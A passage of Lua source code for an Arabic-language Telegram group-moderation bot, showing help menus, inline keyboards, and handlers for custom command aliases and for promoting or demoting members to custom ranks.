✧| اضف نقاط ↫ بالرد • بالايدي
✧| اضف رسائل ↫ بالرد • بالايدي
✧| رفع منظف • تنزيل منظف
✧| المنظفين • حذف المنظفين
✧| رفع مدير • تنزيل مدير
✧| المدراء • حذف المدراء
✧| تفعيل • تعطيل + الامر ↫ ⤈
✧| نزلني • امسح
✧| الحظر • الكتم
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| اوامر المنشئين الاساسيين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| وضع لقب + اللقب
✧| تفعيل • تعطيل ↫ الرفع
✧| رفع منشئ • تنزيل منشئ
✧| المنشئين • حذف المنشئين
✧| رفع • تنزيل ↫ مشرف
✧| رفع بكل الصلاحيات
✧| حذف القوائم
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| اوامر المالكين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| رفع • تنزيل ↫ منشئ اساسي
✧| حذف المنشئين الاساسيين 
✧| المنشئين الاساسيين 
✧| حذف جميع الرتب
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| [Source Channel](https://t.me/UUKXX)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList5:(.*)') then
local Rio = DataText:match('/HelpList5:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevRio:get(David..'Rio:Help5')
local Text = [[
✧| اوامر المطورين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| الكروبات
✧| المطورين
✧| المشتركين
✧| الاحصائيات
✧| المجموعات
✧| اسم البوت + غادر
✧| اسم البوت + تعطيل
✧| كشف + -ايدي المجموعه
✧| رفع مالك • تنزيل مالك
✧| المالكين • حذف المالكين
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| رفع • تنزيل ↫ مدير عام
✧| حذف • المدراء العامين 
✧| رفع • تنزيل ↫ ادمن عام
✧| حذف • الادمنيه العامين 
✧| رفع • تنزيل ↫ مميز عام
✧| حذف • المميزين عام 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| اوامر المطور الاساسي ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| تحديث
✧| الملفات
✧| المتجر
✧| السيرفر
✧| روابط القروبات
✧| تحديث السورس
✧| تنظيف القروبات
✧| تنظيف المشتركين
✧| حذف جميع الملفات
✧| تعيين الايدي العام
✧| تغير المطور الاساسي
✧| حذف معلومات الترحيب
✧| تغير معلومات الترحيب
✧| غادر + -ايدي المجموعه
✧| تعيين عدد الاعضاء + العدد
✧| حظر عام • الغاء العام
✧| كتم عام • الغاء العام
✧| قائمه العام • حذف قائمه العام
✧| وضع • حذف ↫ اسم البوت
✧| اضف • حذف ↫ رد عام
✧| ردود المطور • حذف ردود المطور
✧| تعيين • حذف • جلب ↫ رد الخاص
✧| جلب نسخه الكروبات
✧| رفع النسخه + بالرد على الملف
✧| تعيين • حذف ↫ قناة الاشتراك
✧| جلب كليشه الاشتراك
✧| تغيير • حذف ↫ كليشه الاشتراك
✧| رفع • تنزيل ↫ مطور
✧| المطورين • حذف المطورين
✧| رفع • تنزيل ↫ مطور ثانوي
✧| الثانويين • حذف الثانويين
✧| تعيين • حذف ↫ كليشة الايدي
✧| اذاعه للكل بالتوجيه ↫ بالرد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| تفعيل ملف + اسم الملف
✧| تعطيل ملف + اسم الملف
✧| تفعيل • تعطيل + الامر ↫ ⤈
✧| الاذاعه • الاشتراك الاجباري
✧| ترحيب البوت • المغادره
✧| البوت الخدمي • التواصل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| [Source Channel](https://t.me/UUKXX)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList6:(.*)') then
local Rio = DataText:match('/HelpList6:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevRio:get(David..'Rio:Help6')
local Text = [[
✧| اوامر الاعضاء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| السورس • موقعي • رتبتي • معلوماتي 
✧| رقمي • لقبي • نبذتي • صلاحياتي • غنيلي
✧| ميمز • متحركه • صوره • ريمكس • فلم • مسلسل • انمي
✧| رسائلي • حذف رسائلي • اسمي • معرفي 
✧| ايدي •ايديي • جهاتي • راسلني • الالعاب 
✧| نقاطي • بيع نقاطي • القوانين • زخرفه 
✧| رابط الحذف • نزلني • اطردني • المطور 
✧| من ضافني • مشاهدات المنشور • الرابط 
✧| ايدي المجموعه • معلومات المجموعه 
✧| نسبه الحب • نسبه الكره • نسبه الغباء 
✧| نسبه الرجوله • نسبه الانوثه • التفاعل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| لقبه + بالرد
✧| قول + الكلمه
✧| زخرفه + اسمك
✧| برج + نوع البرج
✧| معنى اسم + الاسم
✧| بوسه • بوسها ↫ بالرد
✧| احسب + تاريخ ميلادك
✧| هينه • هينها ↫ بالرد • بالمعرف
✧| صيحه • صيحها ↫ بالرد • بالمعرف
✧| صلاحياته ↫ بالرد • بالمعرف • بالايدي
✧| ايدي • كشف  ↫ بالرد • بالمعرف • بالايدي
✧| تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
✧| انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| [Source Channel](https://t.me/UUKXX)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| عذرا الامر ليس لك .")..'&show_alert=true')
end
end
end
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
text = msg.content_.text_ 
if text and DevRio:get(David.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevRio:get(David.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevRio:del(David.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevRio:del(David.."Set:Cmd:Group:New"..msg.chat_id_)
DevRio:srem(David.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| تم حذف الامر من المجموعه", 1, 'html')  
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| لايوجد امر بهذا الاسم", 1, 'html')
end
DevRio:del(David.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevRio:get(David..'Rio:NameBot') or "مختل")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevRio:get(David..'Rio:NameBot') or "مختل")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevRio:get(David.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevRio:get(David.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevRio:set(David.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| ارسل الامر الجديد", 1, 'html')
DevRio:del(David.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevRio:set(David.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevRio:get(David.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevRio:get(David.."Set:Cmd:Group:New"..msg.chat_id_)
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| تم حفظ الامر", 1, 'html')
DevRio:del(David.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevRio:smembers(David.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "✧| قائمة الاوامر المضافه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
Cmds = DevRio:get(David.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
end
end
if #List == 0 then
t = "✧| لاتوجد اوامر مضافه في المجموعه"
end
Dev_Rio(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "حذف الاوامر المضافه" and ChCheck(msg) or text == "حذف الاوامر" and ChCheck(msg) or text == "مسح الاوامر المضافه" and ChCheck(msg) then
local List = DevRio:smembers(David.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(David.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevRio:del(David.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| تم حذف الاوامر المضافه في المجموعه", 1, 'html')
end
if text == "ترتيب الاوامر" and Constructor(msg) and ChCheck(msg) then
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"غ")
DevRio:set(David.."Set:Cmd:Group:New1"..msg.chat_id_..":#","مسح قائمه العام")
DevRio:sadd(David.."List:Cmd:Group:New"..msg.chat_id_,"#")
send(msg.chat_id_, msg.id_,"✧| تم ترتيب الاوامر بالشكل التالي ~\n✧|  ايدي - ا .\n✧|  رفع مميز - م .\n✧| رفع ادمن - اد .\n✧|  رفع مدير - مد . \n✧|  رفع منشى - من . \n✧|  رفع منشئ الاساسي - اس  .\n✧|  رفع مطور - مط .\n✧| رفع مطور ثانوي - ثانوي .\n✧|  تنزيل الكل - تك .\n✧|  تعطيل الايدي بالصوره - تعط .\n✧|  تفعيل الايدي بالصوره - تفع .\n✧|  الرابط - ر .\n✧|  ردود المدير - رر .\n✧|  مسح المكتومين - ،، .\n✧|  اضف رد - رد .\n✧|  مسح سحكاتي - سح .\n✧|  مسح رسائلي - رس .\n✧|  غنيلي - غ .\n✧| مسح قائمه العام - #")  
end
if text == "اضف امر" and ChCheck(msg) or text == "اضافة امر" and ChCheck(msg) or text == "اضافه امر" and ChCheck(msg) then
DevRio:set(David.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| ارسل الامر القديم", 1, 'html')
return false
end
if text == "حذف امر" and ChCheck(msg) or text == "مسح امر" and ChCheck(msg) then 
DevRio:set(David.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
return false
end
end
--     Source David     --

if text == "الصلاحيات" and ChCheck(msg) or text == "صلاحيات" and ChCheck(msg) then 
local List = DevRio:smembers(David.."Coomds"..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| لاتوجد صلاحيات مضافه", 1, 'html')
return false
end
t = "✧| قائمة الصلاحيات المضافه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
var = DevRio:get(David.."Comd:New:rt:Rio:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
end
end
Dev_Rio(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if Admin(msg) then
if text == "حذف الصلاحيات" and ChCheck(msg) or text == "مسح الصلاحيات" and ChCheck(msg) then
local List = DevRio:smembers(David.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(David.."Comd:New:rt:Rio:"..v..msg.chat_id_)
DevRio:del(David.."Coomds"..msg.chat_id_)
end
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| تم حذف الصلاحيات المضافه", 1, 'html')
end
end
if text and text:match("^اضف صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
DevRio:set(David.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevRio:sadd(David.."Coomds"..msg.chat_id_,ComdNew)  
DevRio:setex(David.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n✧| ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevRio:del(David.."Comd:New:rt:Rio:"..ComdNew..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| تم حذف الصلاحيه", 1, 'html')
end
if DevRio:get(David.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^↫ الغاء ✧|$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| تم الغاء الامر", 1, 'html')
DevRio:del(David.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| تستطيع اضافة صلاحية ( عضو • مميز  • ادمن )\n✧| ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "ادمن" then
if not Manager(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| تستطيع اضافة صلاحية ( عضو • مميز )\n✧| ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مميز" then
if not Admin(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| تستطيع اضافة صلاحية ( عضو )\n✧| ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = DevRio:get(David.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevRio:set(David.."Comd:New:rt:Rio:"..textn..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| تم اضافة الصلاحيه", 1, 'html')
DevRio:del(David.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_RIO = text:match("رفع (.*)")
if DevRio:sismember(David.."Coomds"..msg.chat_id_,DEV_RIO) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrrio = DevRio:get(David.."Comd:New:rt:Rio:"..DEV_RIO..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..data.first_name_..'](t.me/'..(data.username_ or 'UUKXX')..')'..' 」\n✧| تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(David.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO) 
DevRio:sadd(David..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..data.first_name_..'](t.me/'..(data.username_ or 'UUKXX')..')'..' 」\n✧| تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(David.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)
DevRio:sadd(David..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..data.first_name_..'](t.me/'..(data.username_ or 'UUKXX')..')'..' 」\n✧| تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(David.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)  
DevRio:sadd(David..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..data.first_name_..'](t.me/'..(data.username_ or 'UUKXX')..')'..' 」\n✧| تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_RIO = text:match("تنزيل (.*)")
if DevRio:sismember(David.."Coomds"..msg.chat_id_,DEV_RIO) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrrio = DevRio:get(David.."Comd:New:rt:Rio:"..DEV_RIO..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..data.first_name_..'](t.me/'..(data.username_ or 'UUKXX')..')'..' 」\n✧| تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:srem(David..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(David.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..data.first_name_..'](t.me/'..(data.username_ or 'UUKXX')..')'..' 」\n✧| تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:srem(David..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(David.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..data.first_name_..'](t.me/'..(data.username_ or 'UUKXX')..')'..' 」\n✧| تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:srem(David..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(David.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..data.first_name_..'](t.me/'..(data.username_ or 'UUKXX')..')'..' 」\n✧| تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if DevRio:sismember(David.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrrio = DevRio:get(David.."Comd:New:rt:Rio:"..text1[2]..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..result.title_..'](t.me/'..(text1[3] or 'UUKXX')..')'..' 」\n✧| تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(David..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:set(David.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..result.title_..'](t.me/'..(text1[3] or 'UUKXX')..')'..' 」\n✧| تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(David..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:set(David.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..result.title_..'](t.me/'..(text1[3] or 'UUKXX')..')'..' 」\n✧| تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(David..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:set(David.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..result.title_..'](t.me/'..(text1[3] or 'UUKXX')..')'..' 」\n✧| تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| *المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if DevRio:sismember(David.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrrio = DevRio:get(David.."Comd:New:rt:Rio:"..text1[2]..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..result.title_..'](t.me/'..(text1[3] or 'UUKXX')..')'..' 」\n✧| تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:srem(David..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:del(David.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..result.title_..'](t.me/'..(text1[3] or 'UUKXX')..')'..' 」\n✧| تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:srem(David..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:del(David.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..result.title_..'](t.me/'..(text1[3] or 'UUKXX')..')'..' 」\n✧| تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:srem(David..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:del(David.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو ↫ 「 ['..result.title_..'](t.me/'..(text1[3] or 'UUKXX')..')'..' 」\n✧| تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| *المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
--     Source David     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
